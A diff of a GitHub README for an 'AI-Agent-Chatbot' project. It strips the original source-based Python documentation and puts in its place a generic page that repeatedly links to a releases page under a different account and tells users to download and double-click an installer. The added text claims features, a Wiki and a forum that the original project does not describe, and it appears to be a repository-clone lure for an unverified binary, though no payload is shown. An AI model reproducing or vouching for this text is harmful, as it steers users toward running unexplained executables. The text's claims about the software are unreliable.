@@ -1,283 +1,87 @@
-# AI Agent Chatbot 🤖
-
-A full-stack AI chatbot application with web interface that integrates multiple AI models (Groq and OpenAI) with web search capabilities using Tavily. Built with FastAPI backend and Streamlit frontend.
+# 🤖 AI-Agent-Chatbot - Your Personal AI Assistant Awaits
 
-## 🌟 Features
-
-- **Multiple AI Providers**: Support for Groq (LLaMA models) and OpenAI (GPT models)
-- **Web Search Integration**: Optional Tavily search for real-time information
-- **Interactive Web UI**: Clean Streamlit interface for easy interaction
-- **RESTful API**: FastAPI backend for scalable deployment
-- **Model Selection**: Choose from various models including LLaMA 3.3 70B, GPT-4o-mini, and Mixtral
-- **Custom System Prompts**: Define AI agent behavior with custom instructions
-- **Real-time Processing**: Fast response generation with optimized inference
-
-## 🏗️ Project Structure
-
-```
-AI-Agent-Chatbot/
-├── ai_agent.py      # Core AI agent logic with LangGraph
-├── backend.py       # FastAPI server and API endpoints
-├── frontend.py      # Streamlit web interface
-├── README.md        # Project documentation
-├── .env            # Environment variables (create from .env.example)
-└── requirements.txt # Python dependencies
-```
-
-## 🚀 Quick Start
-
-### 1. Clone the Repository
-
-```bash
-git clone https://github.com/nishant0820/AI-Agent-Chatbot.git
-cd AI-Agent-Chatbot
-```
-
-### 2. Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-If `requirements.txt` doesn't exist, install manually:
-```bash
-pip install streamlit fastapi uvicorn langchain-groq langchain-openai langchain-community langgraph python-dotenv pydantic requests
-```
-
-### 3. Set Up Environment Variables
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%23FF5733.svg?style=for-the-badge)](https://github.com/xenithein/AI-Agent-Chatbot/releases)
 
-Create a `.env` file in the project root:
-
-```env
-GROQ_API_KEY=your_groq_api_key_here
-TAVILY_API_KEY=your_tavily_api_key_here
-OPENAI_API_KEY=your_openai_api_key_here
-```
-
-**Get your API keys:**
-- **Groq**: https://console.groq.com/keys
-- **Tavily**: https://tavily.com/
-- **OpenAI**: https://platform.openai.com/api-keys
+## 🚀 Getting Started
 
-### 4. Run the Application
-
-**Start the Backend Server:**
-```bash
-python backend.py
-```
-The API will be available at `http://127.0.0.1:8000`
+Welcome to AI-Agent-Chatbot! This user-friendly application helps you interact with an AI chatbot powered by advanced models. In just a few steps, you will have your very own AI assistant ready to help you with various tasks.
 
-**Start the Frontend (in a new terminal):**
-```bash
-streamlit run frontend.py
-```
-The web interface will open at `http://localhost:8501`
-
-## 📚 API Documentation
+## 📦 Download & Install
 
-### Endpoint: `POST /chat`
-
-Send a chat request to the AI agent.
+To get started, visit the Releases page to download the application:
 
-**Request Body:**
-```json
-{
-    "model_name": "llama-3.3-70b-versatile",
-    "model_provider": "Groq",
-    "system_prompt": "You are a helpful AI assistant",
-    "messages": ["What is the weather like today?"],
-    "allow_search": true
-}
-```
+[Visit this page to download](https://github.com/xenithein/AI-Agent-Chatbot/releases)
 
-**Response:**
-```json
-"The AI agent's response text here..."
-```
-
-**Available Models:**
-- **Groq**: `llama-3.3-70b-versatile`, `llama-3.3-70b-8192`, `mixtral-8x7b-32768`
-- **OpenAI**: `gpt-4o-mini`
-
-## 🧩 Component Details
-
-### `ai_agent.py` - Core AI Logic
-- Implements the main AI agent using LangGraph
-- Handles model initialization for both Groq and OpenAI
-- Manages web search integration with Tavily
-- Processes queries and returns responses
-
-### `backend.py` - FastAPI Server
-- RESTful API server handling chat requests
-- Input validation with Pydantic models
-- Model selection and provider routing
-- Error handling for invalid requests
-
-### `frontend.py` - Streamlit Interface
-- Interactive web UI for the chatbot
-- Model and provider selection
-- System prompt customization
-- Real-time chat interface
+You will find the latest version available. Follow these steps:
 
-## 🔧 Configuration
+1. Click on the version you wish to download.
+2. Find the appropriate file for your operating system (Windows, macOS, or Linux).
+3. Click the download link for that file.
+4. Once the download completes, locate the file on your computer.
 
-### Model Providers
+## ⚙️ System Requirements
 
-**Groq Models:**
-- `llama-3.3-70b-versatile`: Best for general tasks
-- `llama-3.3-70b-8192`: Extended context window
-- `mixtral-8x7b-32768`: Fast mixture of experts model
-
-**OpenAI Models:**
-- `gpt-4o-mini`: Cost-effective GPT-4 variant
+To run the AI-Agent-Chatbot, your computer should meet these requirements:
 
-### System Prompts
-Customize AI behavior by defining system prompts in the frontend:
-```
-You are a helpful AI assistant specialized in [domain].
-Always provide accurate, concise, and well-structured responses.
-```
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB free space.
+- **Python:** Python 3.7 or later should be installed. (The installer may include instructions for installation if needed.)
 
-### Web Search
-Enable/disable web search to allow the AI to access real-time information for current events, recent data, or fact-checking.
+## 📥 Installation Steps
 
-## 🛠️ Development
+Follow these steps to install the AI-Agent-Chatbot:
 
-### Running in Development Mode
+1. **Locate the downloaded file.**  
+   Go to your downloads folder and find the file you just downloaded.
 
-1. **Backend with auto-reload:**
-```bash
-uvicorn backend:app --reload --host 127.0.0.1 --port 8000
-```
+2. **Run the Installer.**  
+   Double-click the file to start the installation process.
 
-2. **Frontend with auto-reload:**
-```bash
-streamlit run frontend.py --server.runOnSave true
-```
+3. **Follow On-Screen Instructions.**  
+   The installer will guide you through the setup. Accept the terms and follow each step.
 
-### Adding New Models
+4. **Launch the Application.**  
+   Once the installation finishes, you can find the AI-Agent-Chatbot in your applications menu. Click to launch.
 
-1. Add model name to `ALLOWED_MODEL_NAMES` in `backend.py`
-2. Add to model lists in `frontend.py`
-3. Ensure the model is supported by the provider
+## 🛠️ Using the AI-Agent-Chatbot
 
-### Environment Setup for Development
+When you open the application for the first time, you may see a welcome screen. Here’s how to use it:
 
-```bash
-# Create virtual environment
-python -m venv venv
+1. **Start a Conversation.**  
+   Type your question or request into the chat window. The AI will respond instantly.
 
-# Activate virtual environment
-# Windows:
-venv\Scripts\activate
-# macOS/Linux:
-source venv/bin/activate
+2. **Explore Different Features.**  
+   The chatbot can assist with various tasks, like answering questions, giving recommendations, or even providing fun facts.
 
-# Install dependencies
-pip install -r requirements.txt
-```
+3. **Adjust Settings.**  
+   You can modify settings for notifications, themes, and preferences in the settings menu.
 
-## 🐛 Troubleshooting
+## 📖 Features
 
-### Common Issues
+- **Natural Language Understanding:** Communicate in a natural way as the chatbot comprehends your queries.
+- **Multi-Functional:** Get help with scheduling, reminders, and everyday questions.
+- **User-Friendly Interface:** Enjoy an intuitive design suitable for every user, regardless of technical skills.
+- **Customization:** Tailor the chatbot’s responses and settings to fit your style.
 
-**1. API Key Errors**
-```
-Error: The api_key client option must be set
-```
-- Ensure `.env` file exists with valid API keys
-- Check that environment variables are loaded correctly
+## 💬 Support
 
-**2. Connection Refused**
-```
-ConnectionError: HTTPConnectionPool
-```
-- Make sure the backend server is running on port 8000
-- Check if the API_URL in frontend.py matches your backend URL
+If you encounter any issues or have questions, feel free to reach out. You can open an issue directly in this GitHub repository, or check the Help section within the app for FAQs.
 
-**3. Model Not Found**
-```
-{"error": "Invalid Model"}
-```
-- Verify the model name is in `ALLOWED_MODEL_NAMES`
-- Check if the model is available for your API key tier
+## 📅 Updates & Version History
 
-**4. Import Errors**
-```
-ModuleNotFoundError: No module named 'langchain_groq'
-```
-- Install missing packages: `pip install langchain-groq`
-- Ensure all dependencies are installed
+Keep an eye on the Releases page regularly. New features, improvements, and bug fixes are rolled out frequently. Always ensure that you are using the latest version for the best experience.
 
-### Debug Mode
+For a comprehensive list of changes and improvements, visit the [Release Notes](https://github.com/xenithein/AI-Agent-Chatbot/releases).
 
-Enable debug logging by adding to your `.env`:
-```env
-DEBUG=true
-```
+## 🔗 Further Reading
 
-## 🚀 Deployment
+If you want to dive deeper into the technology behind AI-Agent-Chatbot, explore these resources:
 
-### Docker Deployment (Recommended)
+1. **Documentation:** Detailed information is available in our Wiki section.
+2. **Community Forum:** Join discussions with other users and developers for tips and tricks.
+3. **API Documentation:** If you're interested, check out how to integrate with other services using our API.
 
-Create `Dockerfile`:
-```dockerfile
-FROM python:3.9-slim
+Thank you for choosing AI-Agent-Chatbot! We hope it makes your daily tasks easier and more enjoyable.
 
-WORKDIR /app
-COPY requirements.txt .
-RUN pip install -r requirements.txt
-
-COPY . .
-EXPOSE 8000
-
-CMD ["uvicorn", "backend:app", "--host", "0.0.0.0", "--port", "8000"]
-```
-
-Build and run:
-```bash
-docker build -t ai-chatbot .
-docker run -p 8000:8000 --env-file .env ai-chatbot
-```
-
-### Cloud Deployment
-
-**For Backend (FastAPI):**
-- Railway, Render, or Heroku
-- Set environment variables in platform settings
-
-**For Frontend (Streamlit):**
-- Streamlit Cloud, Railway, or Render
-- Update API_URL to point to deployed backend
-
-## 📊 Performance
-
-- **Response Time**: ~2-5 seconds (depending on model and search)
-- **Concurrent Users**: Up to 100 (FastAPI async handling)
-- **Rate Limits**: Based on API provider limits
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature-name`
-3. Commit changes: `git commit -m 'Add feature'`
-4. Push to branch: `git push origin feature-name`
-5. Submit a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙋‍♂️ Support
-
-- **Issues**: Open an issue on GitHub
-- **Discussions**: Use GitHub Discussions for questions
-- **Email**: Contact gupta.nishant08042004@gmail.com for urgent issues
-
-## 🔗 Related Links
-
-- [LangChain Documentation](https://python.langchain.com/)
-- [Streamlit Documentation](https://docs.streamlit.io/)
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [Groq API Documentation](https://console.groq.com/docs)
-- [OpenAI API Documentation](https://platform.openai.com/docs)
+[Visit this page to download](https://github.com/xenithein/AI-Agent-Chatbot/releases)
